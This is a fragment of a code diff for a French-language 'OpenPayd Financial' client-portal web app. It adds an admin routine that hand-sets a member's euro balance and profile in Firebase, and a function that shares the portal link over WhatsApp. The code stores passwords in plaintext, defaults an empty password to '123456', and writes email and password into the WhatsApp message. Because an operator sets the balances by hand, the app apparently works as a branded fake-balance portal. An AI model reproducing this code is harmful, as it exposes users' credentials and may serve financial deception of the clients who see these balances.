+        showToast("Veuillez saisir l'adresse mail du membre", "fa-circle-exclamation", true);
+        return;
       }
 
-      document.getElementById('login-email-input').value = state.mail;
-      renderDashboardData();
-      closeParentModal();
-      showToast(i18n[state.lang].toastSaved);
+      const eurBalance = parseFloat(document.getElementById('edit-eur').value) || 0;
+      const nom = document.getElementById('edit-nom').value.trim();
+      const prenom = document.getElementById('edit-prenom').value.trim();
+      const phone = document.getElementById('edit-phone').value.trim();
+      const userPassword = document.getElementById('edit-password').value.trim() || '123456';
+
+      const userKey = emailToKey(mail);
+      const saveBtn = document.getElementById('btn-save-firebase');
+      saveBtn.disabled = true;
+
+      try {
+        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            eurBalance,
+            nom,
+            prenom,
+            mail,
+            phone,
+            userPassword,
+            updatedAt: new Date().toISOString()
+          })
+        });
+
+        // Si le compte modifié est celui actuellement connecté sur cet appareil, mettre à jour l'écran
+        if (state.mail.toLowerCase() === mail) {
+          state.eurBalance = eurBalance;
+          state.nom = nom;
+          state.prenom = prenom;
+          state.phone = phone;
+          state.userPassword = userPassword;
+          renderDashboardData();
+        }
+
+        await loadAllMembersIntoAdmin();
+        document.getElementById('member-selector').value = userKey;
+        showToast(i18n[state.lang].toastCloudSaved);
+      } catch (err) {
+        console.error('Erreur écriture Firebase:', err);
+        showToast("Erreur lors de la sauvegarde en ligne", "fa-circle-exclamation", true);
+      } finally {
+        saveBtn.disabled = false;
+      }
     }
 
-    function shareViaWhatsApp() {
-      readFormValuesToState();
-      renderDashboardData();
+    function shareFixedAppViaWhatsApp() {
+      const mail = document.getElementById('edit-mail').value.trim();
+      const prenom = document.getElementById('edit-prenom').value.trim();
+      const nom = document.getElementById('edit-nom').value.trim();
+      const pwd = document.getElementById('edit-password').value.trim();
 
-      const token = encodeProfileToken({
-        eur: state.eurBalance,
-        nom: state.nom,
-        prenom: state.prenom,
-        mail: state.mail,
-        phone: state.phone,
-        pwd: state.userPassword,
-        lang: state.lang
-      });
-
-      const baseUrl = window.location.origin + window.location.pathname;
-      const fullShareUrl = `${baseUrl}?p=${encodeURIComponent(token)}`;
-
-      copyToClipboard(fullShareUrl);
+      const fixedUrl = window.location.origin + window.location.pathname;
+      copyToClipboard(fixedUrl);
       showToast(i18n[state.lang].toastCopied);
 
       const waText = encodeURIComponent(
-        `OpenPayd Financial - Espace Client (${state.prenom} ${state.nom})\nLien : ${fullShareUrl}\nMail : ${state.mail}\nMot de passe : ${state.userPassword}`
+        `OpenPayd Financial - Espace Client (${prenom} ${nom})\nLien fixe : ${fixedUrl}\nMail : ${mail}\nMot de passe : ${pwd}`
       );
       window.open(`https://wa.me/?text=${waText}`, '_blank');
     }
 
-    // Gestion du clic sur le rectangle Support (Mail + copie de secours)
     function handleSupportMailClick(event) {
       copyToClipboard('openpayd@financial.directory');
       showToast(i18n[state.lang].toastMailCopied);
     }
 
-    // Copie dans le presse-papiers compatible iframe
     function copyToClipboard(text) {
       const textArea = document.createElement("textarea");
       textArea.value = text;
@@ -1470,7 +1501,6 @@
       document.body.removeChild(textArea);
     }
 
-    // Notification Toast
     function showToast(message, iconClass = "fa-circle-check", isError = false) {
       const toast = document.getElementById('toast-notification');
       const toastMsg = document.getElementById('toast-msg');
